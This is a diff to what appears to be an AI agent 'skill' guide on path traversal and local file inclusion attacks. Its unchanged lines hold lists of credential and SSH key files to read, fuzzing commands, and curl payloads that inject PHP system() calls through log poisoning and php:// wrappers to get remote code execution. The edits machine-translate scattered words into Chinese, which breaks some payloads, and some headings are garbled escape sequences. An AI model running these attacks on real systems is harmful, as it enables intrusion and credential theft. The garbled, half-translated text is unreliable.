@@ -215,7 +215,7 @@ High-value files to target:
 /root/.ssh/id_rsa           # Root private key
 /root/.ssh/authorized_keys  # Authorized keys
 /home/<user>/.ssh/id_rsa    # User private keys
-/etc/ssh/sshd_config        # SSH configuration
+/etc/ssh/sshd_config        # SSH 配置
 
 # Web server files
 /etc/apache2/apache2.conf
@@ -260,7 +260,7 @@ C:\windows\repair\SAM
 C:\inetpub\wwwroot\web.config
 C:\inetpub\logs\LogFiles\W3SVC1\
 
-# Configuration files
+# 配置 files
 C:\xampp\apache\conf\httpd.conf
 C:\xampp\mysql\data\mysql\user.MYD
 C:\xampp\passwords.txt
@@ -277,12 +277,12 @@ C:\Documents and Settings\<user>\
 #### Using Burp Suite
 
 ```
-1. Capture request with file parameter
+1. Capture 请求 with file 参数
 2. Send to Intruder
-3. Mark file parameter value as payload position
+3. Mark file 参数 value as 载荷 position
 4. Load path traversal wordlist
 5. Start attack
-6. Filter responses by size/content for success
+6. 过滤器 responses by size/content for success
 ```
 
 #### Using ffuf
@@ -309,7 +309,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
 
 # With headers/cookies
 wfuzz -c -z file,traversal.txt \
-      -H "Cookie: session=abc123" \
+      -H "Cookie: 会话=abc123" \
       "http://target.com/load?path=FUZZ"
 ```
 
@@ -336,7 +336,7 @@ curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
 curl -A "<?php system('id'); ?>" \
      "http://target.com/page?file=/proc/self/environ"
 
-# With command parameter
+# With command 参数
 curl -A "<?php system(\$_GET['c']); ?>" \
      "http://target.com/page?file=/proc/self/environ&c=whoami"
 ```
@@ -344,8 +344,8 @@ curl -A "<?php system(\$_GET['c']); ?>" \
 #### PHP Wrapper Exploitation
 
 ```bash
-# php://filter - Read source code as base64
-curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
+# php://过滤器 - Read source code as base64
+curl "http://target.com/page?file=php://过滤器/convert.base64-encode/resource=config.php"
 
 # php://input - Execute POST data as PHP
 curl -X POST -d "<?php system('id'); ?>" \
@@ -360,7 +360,7 @@ curl "http://target.com/page?file=expect://id"
 
 ### /u9636/u6bb5 9/uff1a/u6d4b/u8bd5/u65b9/u6cd5/u8bba
 
-Structured testing approach:
+Structured testing 方法:
 
 ```bash
 # Step 1: Identify potential parameters
@@ -384,7 +384,7 @@ Structured testing approach:
 ../../../etc/passwd%00.jpg
 
 # Step 7: Attempt wrapper exploitation
-php://filter/convert.base64-encode/resource=index.php
+php://过滤器/convert.base64-encode/resource=index.php
 
 # Step 8: Attempt log poisoning for RCE
 ```
@@ -435,17 +435,17 @@ def safe_file_access(base_dir, filename):
 
 ### Common Payloads
 
-| Payload | Target |
+| 载荷 | Target |
 |---------|--------|
 | `../../../etc/passwd` | Linux password file |
 | `..\..\..\..\windows\win.ini` | Windows INI file |
-| `....//....//....//etc/passwd` | Bypass simple filter |
+| `....//....//....//etc/passwd` | Bypass simple 过滤器 |
 | `/etc/passwd` | Absolute path |
-| `php://filter/convert.base64-encode/resource=config.php` | Source code |
+| `php://过滤器/convert.base64-encode/resource=config.php` | Source code |
 
 ### Target Files
 
-| OS | File | Purpose |
+| OS | File | 目的 |
 |----|------|---------|
 | Linux | `/etc/passwd` | User accounts |
 | Linux | `/etc/shadow` | Password hashes |
@@ -484,9 +484,9 @@ def safe_file_access(base_dir, filename):
 
 | Problem | Solutions |
 |---------|-----------|
-| No response difference | Try encoding, blind traversal, different files |
-| Payload blocked | Use encoding variants, nested sequences, case variations |
-| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, session poisoning |
+| No 响应 difference | Try encoding, blind traversal, different files |
+| 载荷 blocked | Use encoding variants, nested sequences, case variations |
+| Cannot escalate to RCE | Check logs, PHP wrappers, file upload, 会话 poisoning |
 
 ## /u4f55/u65f6/u4f7f/u7528
-This skill is applicable to execute the workflow or actions described in the overview.
+This skill is applicable to execute the 工作流 or actions described in the 概述.
